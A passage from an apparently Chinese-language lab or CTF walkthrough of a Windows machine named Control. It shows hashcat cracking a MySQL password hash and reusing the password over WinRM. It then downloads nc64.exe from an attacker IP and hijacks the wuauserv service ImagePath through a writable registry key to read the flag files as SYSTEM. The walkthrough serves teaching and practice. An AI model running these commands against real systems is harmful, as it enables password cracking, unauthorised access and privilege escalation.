ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (27804 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 300 (MySQL4.1/MySQL5)
Hash.Target......: 0e178792e8fc304a2e3133d535d38caf1da3cd9d
Time.Started.....: Mon Oct 12 23:11:31 2026 (1 sec)
Time.Estimated...: Mon Oct 12 23:11:32 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  6994.0 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6406144/14344385 (44.66%)
Rejected.........: 0/6406144 (0.00%)
Restore.Point....: 6397952/14344385 (44.60%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: la-lily -> l1i4s8a8
Hardware.Mon.#01.: Util: 31%

Started: Mon Oct 12 23:11:20 2026
Stopped: Mon Oct 12 23:11:33 2026
```

用 hector 的口令连本机 WinRM，报错登录会话不存在，用户名里少了机器前缀。

```bash
PS C:\inetpub\wwwroot> $p = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
PS C:\inetpub\wwwroot> $c = New-Object System.Management.Automation.PSCredential('hector',$p)
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { whoami; hostname } -ErrorAction Stop
ERR: [localhost] Connecting to remote server localhost failed with the following error message : WinRM cannot process the request. The following error with errorcode 0x8009030d occurred while using Negotiate authentication: A specified logon session does not exist. It may already have been terminated.  
 Possible causes are:
  -The user name or password specified are invalid.
  -Kerberos is used when no authentication method and no user name are specified.
  -Kerberos accepts domain user names, but not local user names.
  -The Service Principal Name (SPN) for the remote computer name and port does not exist.
  -The client and remote computers are in different domains and there is no trust between the two domains.
 After checking for the above issues, try the following:
  -Check the Event Viewer for events related to authentication.
  -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport.
 Note that computers in the TrustedHosts list might not be authenticated.
   -For more information about WinRM configuration, run the following command: winrm help config. For more information, see the about_Remote_Troubleshooting Help topic.
```

记下 wuauserv 原本的二进制路径。

```bash
PS C:\inetpub\wwwroot> reg query HKLM\System\CurrentControlSet\Services\wuauserv /v ImagePath HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\wuauserv ImagePath REG_EXPAND_SZ %systemroot%\system32\svchost.exe -k netsvcs -p
```

尝试修改服务的启动路径，但是这条命令没有回显。

```bash
PS C:\inetpub\wwwroot> sc query wuauserv
PS C:\inetpub\wwwroot> reg add HKLM\System\CurrentControlSet\Services\wuauserv /v ImagePath /t REG_EXPAND_SZ /d "cmd /c whoami > C:\Apps\svc.txt 2>&1" /f
```

把输出重定向到自定义的文件夹再读。

```bash
PS C:\Apps> reg add HKLM\System\CurrentControlSet\Services\wuauserv /v ImagePath /t REG_EXPAND_SZ /d "cmd /c whoami > C:\Apps\svc.txt 2>&1" /f > C:\Apps\reg1.txt 2>&1
PS C:\Apps> dir


    Directory: C:\Apps


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/13/2026   4:51 AM          57344 gp.exe                                                                
-a----       10/13/2026   4:57 AM         153600 jp.exe                                                                
-a----       10/13/2026   5:45 AM          27136 ps.exe                                                                
-a----       10/13/2026   5:38 AM            714 reg1.txt                                                              
-a----       10/13/2026   5:37 AM             14 test.txt       
```

权限失败了，iusr 改不了这个注册表键。

```bash
PS C:\Apps> type reg1.txt
reg : ERROR: Access is denied.
At line:1 char:1
+ reg add HKLM\System\CurrentControlSet\Services\wuauserv /v ImagePath  ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (ERROR: Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

加上机器名前缀后 WinRM 就通了。

```bash
PS C:\Apps> $p = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('FIDELITY\hector',$p)
PS C:\Apps> Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { whoami } -ErrorAction Stop
control\hector
```

## 提权至 Administrator

查看权限，没有可利用的。

```bash
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { whoami /priv } -ErrorAction Stop

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

确认 hector 的权限，是普通用户，但是属于 Remote Management Users。
 
```bash
PS C:\inetpub\wwwroot> net user hector
User name                    Hector
Full Name                    Hector
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/1/2019 12:27:50 PM
Password expires             Never
Password changeable          11/1/2019 12:27:50 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/13/2026 7:56:32 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```

查询服务注册表键的权限，CONTROL/Hector 带 FullControl。

```bash
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { (Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services').AccessToString; '--- stopped ---'; Get-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.StartType -ne 'Disabled' } | Select-Object -First 15 -ExpandProperty Name } -ErrorAction Continue
CREATOR OWNER Allow  FullControl
NT AUTHORITY\Authenticated Users Allow  ReadKey
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
CONTROL\Hector Allow  FullControl
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
--- stopped ---
```

准备好 nc64。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Control]
└─$ ls -liah nc64.exe                
3544143 -rwxrwxr-x 1 kali kali 45K Oct 13 02:07 nc64.exe

```

下载到自定义文件夹。

```bash
PS C:\Apps> IWR http://10.10.16.151:80/nc64.exe -OutFile C:\Apps\nc64.exe -UseBasicParsing
PS C:\Apps> dir


    Directory: C:\Apps


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/13/2026   4:51 AM          57344 gp.exe                                                                
-a----       10/13/2026   4:57 AM         153600 jp.exe                                                                
-a----       10/13/2026   8:16 AM          45272 nc64.exe 
```

执行命令并下载结果到本地。

```bash
PS C:\Apps> Get-Service wuauserv | Select-Object Status,StartType

 Status StartType
 ------ ---------
Stopped    Manual


PS C:\Apps> $payload = 'cmd /c type C:\Users\Hector\Desktop\user.txt > C:\Apps\f.txt 2>&1 & type C:\Users\Administrator\Desktop\root.txt >> C:\Apps\f.txt'
PS C:\Apps> $reg = 'reg add "HKLM\SYSTEM\CurrentControlSet\Services\wuauserv" /v ImagePath /t REG_EXPAND_SZ /d "' + $payload + '" /f'
PS C:\Apps> $p = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('CONTROL\hector',$p)
PS C:\Apps> Invoke-Command -ComputerName localhost -Credential $c -ScriptBlock { param($x) cmd /c $x } -ArgumentList $reg
The operation completed successfully.

PS C:\Apps> cmd /c 'sc start wuauserv'
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```
